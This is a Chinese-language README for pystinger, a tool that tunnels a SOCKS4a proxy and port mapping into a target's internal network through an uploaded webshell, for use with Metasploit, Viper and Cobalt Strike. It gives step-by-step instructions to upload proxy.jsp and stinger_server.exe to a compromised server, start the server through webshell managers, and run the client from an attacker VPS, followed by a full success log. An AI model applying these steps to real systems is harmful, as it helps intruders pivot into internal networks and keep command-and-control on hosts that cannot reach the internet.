# 毒刺(pystinger)

毒刺(pystinger)通过webshell实现**内网SOCK4代理**,**端口映射**.

可直接用于metasploit-framework,viper,cobalt strike上线.

主体使用python开发,当前支持php,jsp(x),aspx三种代理脚本.

# 使用方法

> 假设不出网服务器域名为 [http://example.com:8080](http://192.168.3.11:8080) ,服务器内网IP地址为192.168.3.11

## SOCK4代理


* proxy.jsp上传到目标服务器,确保 [http://example.com:8080/proxy.jsp](http://192.168.3.11:8080/proxy.jsp) 可以访问,页面返回 stinger XXX!
* 将stinger_server.exe上传到目标服务器,蚁剑/冰蝎执行```start D:/XXX/stinger_server.exe```启动服务端
> 不要直接运行D:/XXX/stinger_server.exe,会导致tcp断连
* vps执行```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000```
* 如下输出表示成功
```
root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
2020-01-06 21:12:47,674 - INFO - 628 - WEBSHELL checking ...
2020-01-06 21:12:47,681 - INFO - 631 - WEBSHELL check pass
2020-01-06 21:12:47,681 - INFO - 632 - http://example.com:8080/proxy.jsp
2020-01-06 21:12:47,682 - INFO - 637 - REMOTE_SERVER checking ...
2020-01-06 21:12:47,696 - INFO - 644 - REMOTE_SERVER check pass
2020-01-06 21:12:47,696 - INFO - 645 - --- Sever Config ---
2020-01-06 21:12:47,696 - INFO - 647 - client_address_list => []
2020-01-06 21:12:47,696 - INFO - 647 - SERVER_LISTEN => 127.0.0.1:60010
2020-01-06 21:12:47,696 - INFO - 647 - LOG_LEVEL => INFO
2020-01-06 21:12:47,697 - INFO - 647 - MIRROR_LISTEN => 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 647 - mirror_address_list => []
2020-01-06 21:12:47,697 - INFO - 647 - READ_BUFF_SIZE => 51200
2020-01-06 21:12:47,697 - INFO - 673 - TARGET_ADDRESS : 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 677 - SLEEP_TIME : 0.01
2020-01-06 21:12:47,697 - INFO - 679 - --- RAT Config ---
2020-01-06 21:12:47,697 - INFO - 681 - Handler/LISTEN should listen on 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 683 - Payload should connect to 127.0.0.1:60020
2020-01-06 21:12:47,698 - WARNING - 111 - LoopThread start
2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
```
* 此时已经在vps```127.0.0.1:60000```启动了一个```192.168.3.11```所在内网的**socks4a**代理
* 此时已经将目标服务器的```127.0.0.1:60020```映射到vps
